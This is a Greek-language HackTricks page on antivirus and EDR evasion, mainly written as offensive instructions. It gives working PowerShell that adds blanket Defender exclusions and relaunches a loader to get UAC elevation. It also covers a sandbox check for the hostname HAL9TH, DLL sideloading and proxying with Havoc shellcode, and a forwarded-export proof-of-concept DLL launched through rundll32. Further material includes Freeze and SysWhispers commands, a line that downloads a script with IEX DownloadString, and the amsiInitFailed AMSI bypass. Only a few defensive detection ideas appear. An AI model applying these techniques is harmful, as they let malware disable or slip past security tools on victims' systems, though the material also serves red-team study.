# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από τον** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο για να σταματήσει τη λειτουργία του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την παραποίηση του Defender

Δημόσιοι loaders που μεταμφιέζονται συχνά σε cheats παιχνιδιών διανέμονται ως unsigned Node.js/Nexe installers, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και μετά εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχει αν υπάρχει διοικητικό περιβάλλον με το `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης που την εκτελεί έχει δικαιώματα admin, επομένως η αποτυχία δείχνει ότι ο loader εκτελείται ως απλός χρήστης.
2. Εκκινεί ξανά αμέσως τον εαυτό του με το ρήμα `RunAs`, ώστε να εμφανιστεί η αναμενόμενη προτροπή συγκατάθεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «cracked» λογισμικό, επομένως συνήθως αποδέχονται την προτροπή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Αφού αποκτήσουν αυξημένα δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender, αντί να απενεργοποιήσουν εντελώς την υπηρεσία. Ο loader τερματίζει πρώτα το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και έπειτα προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην μπορεί να γίνει σάρωση σε κάθε προφίλ χρήστη, κατάλογο συστήματος και αφαιρούμενο δίσκο:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο filesystem (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που αποθηκεύεται οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι attackers διατηρούν τη δυνατότητα να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να αγγίξουν ξανά το Defender.
- Όλες οι αλλαγές καταχωρίζονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις διατηρούνται ή να τις επεκτείνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «antivirus active», παρότι η επιθεώρηση σε πραγματικό χρόνο δεν αγγίζει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία AV Evasion**

Οι AV χρησιμοποιούν σήμερα διαφορετικές μεθόδους για να ελέγχουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis και, στα πιο προηγμένα EDR, behavioural analysis.

### **Static detection**

Το Static detection επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων συμβολοσειρών ή ακολουθιών bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, icon, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτό το είδος εντοπισμού:

- **Encryption**

Αν κάνετε encryption το binary, ο AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιον loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένες συμβολοσειρές στο binary ή στο script σας για να το περάσετε από τον AV, αλλά αυτό μπορεί να απαιτήσει πολύ χρόνο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστά bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε τον εντοπισμό μέσω static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Χωρίζει ουσιαστικά το αρχείο σε πολλαπλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποιες συμβολοσειρές ή ποια bytes στο binary σας επισημαίνονται.

Συνιστώ ανεπιφύλακτα να δείτε αυτήν την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με το πρακτικό AV Evasion.

### Offline δοκιμές χαρακτηριστικών PE για static classifiers

Τα bytes ενός packed ή encrypted payload είναι μόνο μία από τις εισόδους ενός static classifier. Το EMBER2024 εξάγει χαρακτηριστικά PE, όπως imports, exports, sections, headers και δεδομένα Authenticode.<sup>[[48]](#references)</sup> Σε ένα πείραμα με loader, η προσθήκη 141 imports που έμοιαζαν ακίνδυνα μείωσε το malicious score του EMBER2024 κατά 93%, ενώ imports που συσχετίζονται με malware το αύξησαν. Αυτό είναι αποτέλεσμα για το συγκεκριμένο μοντέλο και τα συγκεκριμένα δείγματα, όχι αξιόπιστη παράκαμψη κάποιου συγκεκριμένου προϊόντος AV/EDR.<sup>[[50]](#references)</sup>

Για μια εξουσιοδοτημένη δοκιμή loader, διατηρήστε σταθερά το payload και τη διαδρομή εκτέλεσης, αλλάξτε μία επιδιωκόμενη μεταβλητή build ανά variant και συγκρίνετε τα scores offline. Εξετάστε τα χαρακτηριστικά PE που προκύπτουν, επειδή μια αλλαγή στο build μπορεί να επηρεάσει περισσότερες από μία ομάδες χαρακτηριστικών.<sup>[[49]](#references)[[50]](#references)</sup> Για να διατηρήσετε τα imports που θέλετε στο IAT, καλέστε τα επιλεγμένα Win32 APIs από κώδικα που είναι προσβάσιμος. Αλλάζετε την επιλογή και κατανέμετε τα σημεία κλήσης μεταξύ των builds, αντί να δημιουργείτε μια σταθερή συνάρτηση camouflage που μπορεί να γίνει signature. Το πείραμα ανέφερε επίσης χαμηλότερα scores με έγκυρο code signing, καταχωρίσεις export και περισσότερες συναρτήσεις που μεγαλώνουν το `.pdata`· το μη έγκυρο signing είχε μικρή επίδραση, ενώ η επίδραση του `.pdata` ήταν μικρή.<sup>[[50]](#references)</sup>

Το package `thrember` παρέχει εξαγωγή χαρακτηριστικών και μοντέλα benchmark. Αφού το εγκαταστήσετε, χρησιμοποιήστε το `thrember.download_models("models")` με έναν υπάρχοντα κατάλογο `models` και, στη συνέχεια, εκτελέστε τον scorer από τον γονικό κατάλογο: το helper λήψης αλλάζει τον τρέχοντα κατάλογο εργασίας. Ο PE classifier μπορεί να βαθμολογήσει έναν κατάλογο με builds χωρίς να τα υποβάλει σε υπηρεσία σάρωσης:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep the model and feature-extractor versions fixed during comparison. A lower offline score only shows how this classifier reacts to the changed binary; it does not prove evasion of behavioral analysis, emulation, or a vendor's different model.<sup>[[49]](#references)[[50]](#references)</sup> For [per-build polymorphism and outer-binary camouflage in virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), see the separate execution model.

### **Dynamic analysis**

Dynamic analysis είναι όταν το AV εκτελεί το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο περίπλοκο, αλλά δείτε μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης του dynamic analysis του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία χωρίς να διακόψουν τη ροή εργασίας του χρήστη, οπότε οι μεγάλες καθυστερήσεις μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με τον τρόπο υλοποίησής της.
- **Έλεγχος των πόρων του μηχανήματος** Συνήθως τα sandboxes διαθέτουν ελάχιστους πόρους (π.χ. < 2GB RAM), διαφορετικά θα μπορούσαν να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα υλοποιούνται όλα αυτά στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν αντιστοιχεί σε αυτό που ορίσατε. Αν δεν αντιστοιχεί, μπορείτε να κάνετε το πρόγραμμά σας να τερματιστεί.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender's Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την εκτέλεση. Αν το όνομα είναι HAL9TH, αυτό σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να κάνετε το πρόγραμμά σας να τερματιστεί.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε και νωρίτερα σε αυτή την ανάρτηση, τα **public tools** κάποια στιγμή **εντοπίζονται**, οπότε θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα πιο επισημασμένα malware από τα AV και EDR, αν όχι το πιο επισημασμένο. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΚΑΝΕΤΕ UPLOAD ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να πετύχετε evasion μακροπρόθεσμα. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε ένα VM, δοκιμάστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, να **προτιμάτε πάντα τα DLLs για evasion**. Από την εμπειρία μου, τα αρχεία DLL συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε αυτό είναι ένα πολύ απλό κόλπο για να αποφύγετε την ανίχνευση σε ορισμένες περιπτώσεις (αν το payload σας μπορεί να εκτελεστεί ως DLL, φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό ανίχνευσης 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να είστε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payload(s) δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που επιτρέπουν DLL Hijack/Sideload**. Αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα που επιτρέπουν DLL Sideload, μπορεί να εντοπιστείτε εύκολα.

Αν απλώς τοποθετήσετε ένα κακόβουλο DLL με το όνομα που αναμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, καθώς το πρόγραμμα αναμένει να υπάρχουν συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική DLL μετονομασμένη.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με το [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν ποσοστό Detection 0/26 στο [antiscan.me](https://antiscan.me)! Θα το έλεγα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα για όσα συζητήσαμε, με περισσότερες λεπτομέρειες.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι ενότητες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση export περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Φορτώσει το `TargetDll` αν δεν έχει ήδη φορτωθεί
- Επιλύσει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο namespace KnownDLLs (π.χ., ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της ενότητας που εκτελεί την προώθηση.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: εντοπίστε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα ενότητας που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε το υπογεγραμμένο DLL μαζί με ένα DLL που ελέγχετε και έχει ακριβώς το όνομα του προωθούμενου target module. Όταν κληθεί το forwarded export, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Παρατηρημένη συμπεριφορά:
- Το rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα «missing API» μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές για το κυνήγι:
- Εστιάστε σε forwarded exports όπου το module-στόχος δεν είναι KnownDLL. Τα KnownDLL παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των forwarder των Windows 11 για να αναζητήσετε υποψήφιες επιλογές: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για detection/άμυνα:
- Παρακολουθείτε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Ειδοποιείτε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → `keyiso.dll` εκτός συστήματος → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από τον χρήστη
- Επιβάλλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύετε write+execute στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για παράκαμψη EDRs μέσω suspended processes, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η παράκαμψη εντοπισμού είναι απλώς ένα παιχνίδι γάτας και ποντικιού: ό,τι λειτουργεί σήμερα μπορεί να εντοπίζεται αύριο, επομένως μην βασίζεστε ποτέ σε ένα μόνο εργαλείο· αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλές τεχνικές παράκαμψης.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εισαγωγή μιας εντολής `syscall`/`sysenter`/`SVC #0` στο παραγόμενο stub (χωρίς πρόσβαση σε export του `ntdll`).
- **Indirect**: μετάβαση σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για αποφυγή ευρετικών ελέγχων)· το **randomized indirect** επιλέγει ένα gadget από ένα σύνολο για κάθε κλήση.
- **Egg-hunt**: αποφυγή ενσωμάτωσης της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εύρεση μιας ακολουθίας syscall κατά τον χρόνο εκτέλεσης.

**Στρατηγικές επίλυσης SSN ανθεκτικές σε hooks:**
- **FreshyCalls (VA sort)**: συμπεραίνει τα SSN ταξινομώντας τα syscall stubs με βάση την εικονική διεύθυνσή τους, αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: αντιστοιχίζει ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` του και έπειτα καταργεί την αντιστοίχιση (παρακάμπτει όλα τα hooks στη μνήμη).
- **RecycledGate**: συνδυάζει την εξαγωγή SSN μέσω ταξινόμησης VA με την επικύρωση opcode όταν ένα stub είναι καθαρό· αν έχει hook, χρησιμοποιεί ως εναλλακτική την εξαγωγή μέσω VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά τον χρόνο εκτέλεσης, χωρίς ανάλυση hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων για EXE, COM, MSI ή εγκατάσταση ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή χωρίς κρυπτογράφηση ή obfuscation.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει το `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο αρχείο από το οποίο εκτελέστηκε το script· σε αυτήν την περίπτωση, το powershell.exe

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη χρήση της `Assembly.Load(byte[])` για φόρτωση και εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής της ανίχνευσης.

Ωστόσο, το AMSI μπορεί να αφαιρεί το obfuscation από scripts ακόμη κι αν έχουν πολλά επίπεδα, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο που εφαρμόζεται. Έτσι, η παράκαμψη δεν είναι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών, οπότε αυτό εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία του powershell (καθώς και των cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να το αλλοιώσετε ακόμη και ως μη προνομιούχος χρήστης. Λόγω αυτού του σχεδιαστικού ελαττώματος στην υλοποίηση του AMSI, ερευνητές έχουν ανακαλύψει πολλούς τρόπους αποφυγής της σάρωσης AMSI.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινά καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation), ενώ η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση αυτής της τεχνικής.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα PowerShell για να καταστήσει το AMSI άχρηστο για την τρέχουσα διεργασία PowerShell. Αυτή η γραμμή έχει φυσικά εντοπιστεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

